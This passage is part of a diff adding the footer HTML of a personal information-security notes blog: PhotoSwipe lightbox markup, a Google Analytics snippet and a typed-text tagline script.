+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Notes During Information Security Learning.", "信息安全学习过程中的笔记。"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
